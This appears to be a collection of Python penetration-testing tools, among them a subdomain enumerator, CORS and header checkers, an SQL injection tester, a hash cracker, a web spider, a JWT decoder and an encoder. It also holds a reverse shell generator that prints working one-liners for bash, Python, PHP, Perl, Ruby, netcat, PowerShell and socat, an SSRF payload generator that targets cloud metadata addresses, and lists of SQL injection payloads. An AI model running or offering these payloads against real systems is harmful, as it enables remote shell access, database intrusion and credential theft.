name: Subdomain Enumerator
description: Subdomain discovery using DNS brute forcing and API sources
code:
import socket
import concurrent.futures
import sys

# Subdomain Enumerator
# Brute force subdomains using a wordlist

def check_subdomain(subdomain, domain):
    target = f'{subdomain}.{domain}'
    try:
        ip = socket.gethostbyname(target)
        return (target, ip)
    except socket.gaierror:
        return None

def enumerate(domain, wordlist_path='subdomains.txt'):
    print(f'[*] Enumerating subdomains for: {domain}\n')
    
    # Common subdomains if no wordlist
    common = ['www','mail','ftp','admin','dev','staging',
              'api','app','test','blog','shop','portal',
              'vpn','remote','ns1','ns2','mx','smtp',
              'pop','imap','webmail','cpanel','dashboard',
              'cdn','media','static','assets','img']
    
    try:
        with open(wordlist_path) as f:
            subdomains = [line.strip() for line in f]
    except FileNotFoundError:
        subdomains = common
        print('[!] Wordlist not found, using built-in list')
    
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_subdomain, sub, domain): sub
                   for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                print(f'  [+] {result[0]} -> {result[1]}')
    
    print(f'\n[*] Found {len(found)} subdomains')
    return found

if __name__ == '__main__':
    domain = sys.argv[1] if len(sys.argv) > 1 else 'example.com'
    enumerate(domain)

name: HTTP Header Analyzer
description: Analyze HTTP response headers for security misconfigurations
code:
import requests
import sys

# HTTP Security Header Analyzer
# Check for missing or misconfigured security headers

security_headers = {
    'Strict-Transport-Security': 'HSTS - Forces HTTPS connections',
    'Content-Security-Policy': 'CSP - Prevents XSS and injection',
    'X-Frame-Options': 'Prevents clickjacking attacks',
    'X-Content-Type-Options': 'Prevents MIME type sniffing',
    'X-XSS-Protection': 'Browser XSS filter (legacy)',
    'Referrer-Policy': 'Controls referrer information',
    'Permissions-Policy': 'Controls browser features',
    'Cross-Origin-Opener-Policy': 'COOP - Isolates browsing context',
    'Cross-Origin-Resource-Policy': 'CORP - Controls resource sharing',
    'Cross-Origin-Embedder-Policy': 'COEP - Controls embedding',
}

def analyze(url):
    print(f'[*] Analyzing headers for: {url}\n')
    try:
        r = requests.get(url, timeout=10, verify=False)
    except Exception as e:
        print(f'[!] Error: {e}')
        return
    
    print(f'  Status: {r.status_code}')
    print(f'  Server: {r.headers.get("Server", "Not disclosed")}\n')
    
    print('=== Security Headers ===')
    missing = []
    present = []
    
    for header, desc in security_headers.items():
        value = r.headers.get(header)
        if value:
            present.append(header)
            print(f'  [+] {header}: {value}')
        else:
            missing.append(header)
            print(f'  [-] {header}: MISSING - {desc}')
    
    score = (len(present) / len(security_headers)) * 100
    print(f'\n  Score: {score:.0f}% ({len(present)}/{len(security_headers)} headers)')
    
    # Check for information disclosure
    print('\n=== Information Disclosure ===')
    for h in ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']:
        if h in r.headers:
            print(f'  [!] {h}: {r.headers[h]}')

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'https://example.com'
    analyze(url)

name: CORS Checker
description: Test for CORS misconfigurations that could lead to data theft
code:
import requests
import sys

# CORS Misconfiguration Checker
# Tests various origin reflection patterns

def check_cors(url):
    print(f'[*] Testing CORS on: {url}\n')
    
    origins = [
        'https://evil.com',
        'https://attacker.com',
        'null',
        url.replace('https://', 'http://'),
        f'https://{url.split("//")[1]}.evil.com' if '//' in url else '',
        f'https://evil{url.split("//")[1]}' if '//' in url else '',
    ]
    
    for origin in origins:
        if not origin: continue
        try:
            headers = {'Origin': origin}
            r = requests.get(url, headers=headers, timeout=10)
            acao = r.headers.get('Access-Control-Allow-Origin', '')
            acac = r.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == origin or acao == '*':
                severity = 'HIGH' if acac.lower() == 'true' else 'MEDIUM'
                print(f'  [!] [{severity}] Origin reflected: {origin}')
                print(f'      ACAO: {acao}')
                print(f'      ACAC: {acac}')
            else:
                print(f'  [OK] Origin rejected: {origin}')
        except Exception as e:
            print(f'  [!] Error with {origin}: {e}')

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'https://example.com'
    check_cors(url)

name: SQLi Tester
description: Basic SQL injection detection with error-based and blind techniques
code:
import requests
import sys
import time

# SQL Injection Tester
# Tests for error-based and time-based blind SQLi

error_payloads = [
    "'", '"', "' OR '1'='1", '" OR "1"="1',
    "' OR 1=1--", '" OR 1=1--', "' UNION SELECT NULL--",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
]

time_payloads = [
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR BENCHMARK(10000000,SHA1('test'))--",
]

sql_errors = [
    'sql syntax', 'mysql', 'sqlite', 'postgresql',
    'oracle', 'syntax error', 'unclosed quotation',
    'microsoft sql', 'odbc', 'jdbc', 'ORA-',
    'PG::SyntaxError', 'unterminated',
]

def test_sqli(url, param):
    print(f'[*] Testing SQLi on: {url}?{param}=\n')
    
    # Error-based tests
    print('=== Error-Based Detection ===')
    for payload in error_payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=10)
            for error in sql_errors:
                if error.lower() in r.text.lower():
                    print(f'  [+] SQL Error detected!')
                    print(f'      Payload: {payload}')
                    print(f'      Error: {error}')
                    break
        except:
            pass
    
    # Time-based tests
    print('\n=== Time-Based Detection ===')
    for payload in time_payloads:
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, timeout=15)
            elapsed = time.time() - start
            if elapsed > 4:
                print(f'  [+] Time delay detected: {elapsed:.1f}s')
                print(f'      Payload: {payload}')
        except:
            pass
    
    print('\n[*] Scan complete')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python sqli_tester.py <url> <param>')
        sys.exit(1)
    test_sqli(sys.argv[1], sys.argv[2])

name: Hash Cracker
description: Simple hash cracker supporting MD5, SHA1, SHA256 with wordlist
code:
import hashlib
import sys

# Hash Cracker
# Crack common hash types using wordlist

def identify_hash(hash_value):
    length = len(hash_value)
    types = {
        32: ['md5'],
        40: ['sha1'],
        64: ['sha256'],
        128: ['sha512'],
    }
    return types.get(length, ['unknown'])

def crack(hash_value, wordlist='rockyou.txt'):
    hash_types = identify_hash(hash_value)
    print(f'[*] Hash: {hash_value}')
    print(f'[*] Possible type(s): {hash_types}\n')
    
    common_words = ['password','123456','admin','letmein',
                    'welcome','monkey','dragon','master',
                    'qwerty','login','abc123','password1',
                    'iloveyou','trustno1','sunshine','princess']
    
    try:
        with open(wordlist, encoding='utf-8', errors='ignore') as f:
            words = [l.strip() for l in f]
    except FileNotFoundError:
        words = common_words
        print('[!] Using built-in wordlist')
    
    for hash_type in hash_types:
        if hash_type == 'unknown': continue
        print(f'[*] Trying {hash_type}...')
        for word in words:
            h = hashlib.new(hash_type, word.encode()).hexdigest()
            if h == hash_value.lower():
                print(f'  [+] CRACKED: {word}')
                return word
    
    print('[-] Hash not cracked')
    return None

if __name__ == '__main__':
    h = sys.argv[1] if len(sys.argv) > 1 else '5f4dcc3b5aa765d61d8327deb882cf99'
    crack(h)

name: Reverse Shell Generator
description: Generate reverse shell payloads for various languages
code:
import sys

# Reverse Shell Generator
# Generate reverse shell one-liners for multiple languages

def generate(ip, port):
    shells = {
        'Bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        'Bash (alt)': f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        'Python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'PHP': f"php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'Perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'Ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'Netcat': f"nc -e /bin/sh {ip} {port}",
        'Netcat (no -e)': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        'PowerShell': f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
        'Socat': f"socat TCP:{ip}:{port} EXEC:/bin/bash",
        'Listener': f"nc -lvnp {port}",
    }
    
    print(f'[*] Reverse Shells for {ip}:{port}\n')
    for name, cmd in shells.items():
        print(f'=== {name} ===')
        print(f'{cmd}\n')

if __name__ == '__main__':
    ip = sys.argv[1] if len(sys.argv) > 1 else '10.10.10.1'
    port = sys.argv[2] if len(sys.argv) > 2 else '4444'
    generate(ip, port)

name: Web Spider
description: Web crawler that extracts links, forms, and comments from pages
code:
import requests
from html.parser import HTMLParser
import sys
from urllib.parse import urljoin, urlparse

# Web Spider
# Crawl website and extract links, forms, comments

class Spider(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base = base_url
        self.links = set()
        self.forms = []
        self.comments = []
        self.scripts = []
    
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'a' and 'href' in attrs:
            url = urljoin(self.base, attrs['href'])
            self.links.add(url)
        elif tag == 'form':
            self.forms.append(attrs)
        elif tag == 'script' and 'src' in attrs:
            self.scripts.append(attrs['src'])
    
    def handle_comment(self, data):
        self.comments.append(data.strip())

def crawl(url, depth=2):
    print(f'[*] Spidering: {url} (depth={depth})\n')
    visited = set()
    to_visit = {url}
    domain = urlparse(url).netloc
    all_links = set()
    all_forms = []
    all_comments = []
    all_scripts = set()
    
    for d in range(depth):
        next_level = set()
        for u in to_visit:
            if u in visited: continue
            visited.add(u)
            try:
                r = requests.get(u, timeout=5)
                spider = Spider(u)
                spider.feed(r.text)
                
                for link in spider.links:
                    if urlparse(link).netloc == domain:
                        all_links.add(link)
                        if link not in visited:
                            next_level.add(link)
                
                all_forms.extend(spider.forms)
                all_comments.extend(spider.comments)
                all_scripts.update(spider.scripts)
            except: pass
        to_visit = next_level
    
    print(f'  Links found: {len(all_links)}')
    for l in sorted(all_links)[:20]:
        print(f'    {l}')
    print(f'\n  Forms: {len(all_forms)}')
    print(f'  Comments: {len(all_comments)}')
    print(f'  Scripts: {len(all_scripts)}')

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'http://example.com'
    crawl(url)

name: Wayback URL Extractor
description: Extract historical URLs from Wayback Machine for a target domain
code:
import requests
import sys

# Wayback Machine URL Extractor
# Retrieve historical URLs for a domain

def wayback_urls(domain):
    print(f'[*] Fetching Wayback URLs for: {domain}\n')
    url = f'https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey'
    
    try:
        r = requests.get(url, timeout=30)
        data = r.json()
        urls = list(set([entry[0] for entry in data[1:]]))
        
        print(f'[*] Found {len(urls)} unique URLs\n')
        for u in sorted(urls)[:50]:
            print(f'  {u}')
        if len(urls) > 50:
            print(f'  ... and {len(urls) - 50} more')
        return urls
    except Exception as e:
        print(f'[!] Error: {e}')
        return []

if __name__ == '__main__':
    domain = sys.argv[1] if len(sys.argv) > 1 else 'example.com'
    wayback_urls(domain)

name: JWT Decoder
description: Decode and analyze JWT tokens without verification
code:
import base64
import json
import sys

# JWT Token Decoder & Analyzer
# Decode JWT tokens and check for common weaknesses

def decode_jwt(token):
    print(f'[*] Analyzing JWT Token\n')
    
    parts = token.split('.')
    if len(parts) != 3:
        print('[!] Invalid JWT format')
        return
    
    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    print('=== Header ===')
    print(json.dumps(header, indent=2))
    
    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    print('\n=== Payload ===')
    print(json.dumps(payload, indent=2))
    
    # Security checks
    print('\n=== Security Analysis ===')
    if header.get('alg') == 'none':
        print('  [!] CRITICAL: Algorithm is "none"!')
    if header.get('alg') in ['HS256', 'HS384', 'HS512']:
        print('  [!] Uses symmetric algorithm - test key confusion')
    if 'jku' in header:
        print(f'  [!] JKU header found: {header["jku"]}')
    if 'kid' in header:
        print(f'  [!] KID header found: {header["kid"]}')
    if 'exp' in payload:
        import datetime
        exp = datetime.datetime.fromtimestamp(payload['exp'])
        print(f'  Expires: {exp}')
    if 'admin' in payload or 'role' in payload:
        print(f'  [!] Authorization claims found - test modification')

if __name__ == '__main__':
    if len(sys.argv) > 1:
        decode_jwt(sys.argv[1])
    else:
        print('Usage: python jwt_decoder.py <jwt_token>')

name: SSRF Payload Generator
description: Generate SSRF bypass payloads for various filters
code:
import sys

# SSRF Payload Generator
# Generate payloads to bypass SSRF filters

def generate_payloads(internal_ip='169.254.169.254'):
    print(f'[*] SSRF Bypass Payloads for: {internal_ip}\n')
    
    parts = internal_ip.split('.')
    
    payloads = [
        ('Direct', f'http://{internal_ip}'),
        ('Decimal IP', f'http://{int(parts[0])*16777216 + int(parts[1])*65536 + int(parts[2])*256 + int(parts[3])}'),
        ('Hex IP', f'http://0x{int(parts[0]):02x}{int(parts[1]):02x}{int(parts[2]):02x}{int(parts[3]):02x}'),
        ('Octal', f'http://0{oct(int(parts[0]))[2:]}.0{oct(int(parts[1]))[2:]}.0{oct(int(parts[2]))[2:]}.0{oct(int(parts[3]))[2:]}'),
        ('IPv6 Mapped', f'http://[::ffff:{internal_ip}]'),
        ('IPv6 Short', f'http://[::1]' if internal_ip == '127.0.0.1' else f'http://[::ffff:{internal_ip}]'),
        ('URL Encoding', f'http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34'),
        ('Redirect Bypass', f'http://attacker.com/redirect?url=http://{internal_ip}'),
        ('DNS Rebinding', f'http://1234567890.{internal_ip}.1234567890.rbndr.us'),
        ('Enclosed Alphanumeric', f'http://①⑥⑨.②⑤④.①⑥⑨.②⑤④'),
        ('Rare Address', 'http://0/' if internal_ip.startswith('0.') else f'http://{internal_ip}'),
        ('Localhost Aliases', 'http://localhost'),
        ('Localhost IP', 'http://127.0.0.1'),
        ('Localhost Decimal', 'http://2130706433'),
        ('Localhost Hex', 'http://0x7f000001'),
    ]
    
    for name, payload in payloads:
        print(f'  [{name}]')
        print(f'    {payload}\n')

if __name__ == '__main__':
    ip = sys.argv[1] if len(sys.argv) > 1 else '169.254.169.254'
    generate_payloads(ip)

name: Encoding Converter
description: Convert between various encoding formats used in web attacks
code:
import base64
import urllib.parse
import html
import binascii
import sys

# Encoding/Decoding Converter
# Convert between common encoding formats

def convert(text):
    print(f'[*] Input: {text}\n')
    
    encodings = {
        'URL Encoded': urllib.parse.quote(text),
        'Double URL': urllib.parse.quote(urllib.parse.quote(text)),
        'Base64': base64.b64encode(text.encode()).decode(),
        'Hex': binascii.hexlify(text.encode()).decode(),
        'HTML Entities': html.escape(text),
        'Unicode': ''.join(f'\\u{ord(c):04x}' for c in text),
        'Decimal': ''.join(f'&#{ord(c)};' for c in text),
        'Hex HTML': ''.join(f'&#x{ord(c):x};' for c in text),
        'Octal': ' '.join(f'{ord(c):o}' for c in text),
        'Binary': ' '.join(f'{ord(c):08b}' for c in text),
        'ROT13': text.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
    }
    
    for name, encoded in encodings.items():
        print(f'  [{name}]')
        print(f'    {encoded}\n')

if __name__ == '__main__':
    text = sys.argv[1] if len(sys.argv) > 1 else '<script>alert(1)</script>'
    convert(text)
